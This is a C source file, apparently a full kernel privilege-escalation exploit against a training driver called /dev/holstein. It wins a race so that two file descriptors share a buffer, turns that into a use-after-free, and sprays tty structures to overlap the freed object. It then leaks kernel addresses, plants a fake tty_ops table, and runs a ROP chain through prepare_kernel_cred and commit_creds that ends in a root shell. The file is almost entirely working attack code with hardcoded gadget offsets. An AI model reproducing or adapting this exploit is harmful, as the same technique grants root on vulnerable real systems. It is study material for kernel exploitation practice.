
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>


#define ERROR(x) printf("Error: %s\n", x); return -1;
#define tty_ops_offset                0xc3afe0
#define pop_rdi_ret                   0x0b13c5 + kbase
#define pop_rcx_rbx_rbp_ret           0x3006fc + kbase
#define mov_rdi_rax_rep_movsq_ret     0x65094b + kbase // mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
#define push_rdx_pop_rsp_pop_rbp_ret  0x137da6 + kbase 
#define commit_creds                  0x0723e0 + kbase
#define prepare_kernel_creds          0x072580 + kbase
#define kpti_trampoline               0x800e26 + kbase

uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    ".att_syntax;"
    );
}

int fd1, fd2, win = 0;
void *race(void *args){ // the vulnerability let us open two fds to the same g_buf
    if(sched_setaffinity(gettid(), sizeof(cpu_set_t), (cpu_set_t *)args)){puts("failed to set the current cpu.."); return (void*)-1;}
    int fd;
    while(1){
        while(!win){
            if((fd=open("/dev/holstein", O_RDWR)) < 0){continue;}
            if(fd == fd2){win = 1;}
            if(win == 0 && fd != -1){close(fd);}
        }
        if(write(fd1, "A", 1) < 0 || write(fd2, "A", 1) < 0){close(fd1); close(fd2); win = 0;}
        else{
            win = 1;
            puts("Are you winning son?!");
            break;
        }
    }
    return NULL;
}


void *spray(void *args){
    if(sched_setaffinity(gettid(), sizeof(cpu_set_t), (cpu_set_t *)args)){puts("failed to set the current cpu.."); return (void*)-1;}
    int spray_fd[800];
    for(int i = 0; i < 800; i++){
        if((spray_fd[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){
            for(int j = 0; j < i; j++){close(spray_fd[j]);}
            puts("failed to set the current cpu.."); 
            return (void*)-1;
        }
        int64_t x;
        if(read(fd2, &x, sizeof(int64_t)) == sizeof(int64_t) && x){
            for(int j = 0; j < i; j++){close(spray_fd[j]);} // free all the fds until the last one
            return (void*)spray_fd[i];
        }   
    }
    for(int i = 0; i < 0; i++){close(spray_fd[i]);}
    return (void*)-1;
}
int overlap_fds(){
    pthread_t th1, th2;
    cpu_set_t th1_cpu, th2_cpu;
    CPU_ZERO(&th1_cpu);
    CPU_ZERO(&th2_cpu);
    CPU_SET(0, &th1_cpu);
    CPU_SET(1, &th2_cpu); // make sure the race start on two different cpus
    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    int ret = 0;
    pthread_create(&th1, NULL, race, (void*)&th1_cpu);
    pthread_create(&th2, NULL, race, (void*)&th2_cpu);
    pthread_join(th1, &ret);
    pthread_join(th2, &ret);
    if(ret < 0){ERROR("race failed!")}
    // Now fd1 and fd2 should have the same g_buf, let's test it out
    char test[10];
    if(write(fd1, "UnknownD4", 9) < 0){ERROR("failed to write to the vulnerable driver..")}
    if(read(fd2, test, 9) < 0){ERROR("failed to read from the vulnerable driver..")}
    if(strcmp(test, "UnknownD4") != 0){ERROR("race failed")}
    memset(test, 0, 9);
    if(write(fd1, test, 9) < 0){ERROR("failed to write to the vulnerable driver..")}
    close(fd1); // trigger UAF
    puts("race condition->UAF");
    int victim_fd = -1;
    while(victim_fd == -1){
        pthread_create(&th1, NULL, spray, (void*)&th1_cpu);
        pthread_join(th1, (void*)&victim_fd);
        if(victim_fd == -1){
            pthread_create(&th2, NULL, spray, (void*)&th2_cpu);
            pthread_join(th2, (void*)&victim_fd);
        }
    }
    return victim_fd;
}

int exp_race_condition(){
    save_user_state();
    int victim_fd;
    if((victim_fd = overlap_fds()) < 0){ERROR("failed to overlap fds..")}
    printf("race winners: %d, %d\nrace victim: %d\n", fd1, fd2, victim_fd);

    uint64_t payload[0x400];
    if(read(fd2, payload, 0x400) < 0){ERROR("failed to read from the vulnerable device..")}
    uint64_t kbase = payload[0x18/sizeof(uint64_t)] - tty_ops_offset; // tty_ops at offset 0x18, tty_ops is also the function table pointer we want to fake
    uint64_t g_buf = payload[0x38/sizeof(uint64_t)] - 0x38;           // kernel heap leak to find the g_buf address
    if(kbase & 0xfff){kbase+=0x120;} // fix the kernel base
    printf("kernel base address:  %p\nkernel g_buf address: %p\n", kbase, g_buf);
    
    /* now finally rop! */
    int i = 0;
    payload[i++] = pop_rdi_ret;
    payload[i++] = 0x0;
    payload[i++] = prepare_kernel_creds;
    payload[i++] = pop_rcx_rbx_rbp_ret;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = mov_rdi_rax_rep_movsq_ret;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;   
    /* Find random place to set tty_ops table */
    payload[0x3f8/sizeof(uint64_t)] = push_rdx_pop_rsp_pop_rbp_ret; 
    if(write(fd2, payload, 0x400) < 0){ERROR("failed to write to the vulnerable device..")}

    if((victim_fd = overlap_fds()) < 0){ERROR("failed to overlap fds..")}
    printf("race winners: %d, %d\nrace victim: %d\n", fd1, fd2, victim_fd);
    
    if(read(fd2, payload, 0x400) < 0){ERROR("failed to write to the vulnerable device..")}
    payload[0x18/sizeof(uint64_t)] = g_buf + 0x3f8 - 12 * 8; // our fake function entry is the 12th index of the table.
    if(write(fd2, payload, 0x400) < 0){ERROR("failed to write to the vulnerable device..")}

    ioctl(victim_fd, 0, g_buf - 8); // rsp=g_buf-8; rip=g_buf
    
    return 0;

}



int main(int argc, char **argv){
    exp_race_condition();
    return 0;
}


